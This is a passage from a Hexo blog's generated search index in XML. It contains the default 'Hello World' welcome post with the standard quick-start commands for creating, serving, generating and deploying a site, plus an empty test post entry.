        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>test_my_site</title>
      <link href="/2023/05/02/test-my-site/"/>
      <url>/2023/05/02/test-my-site/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
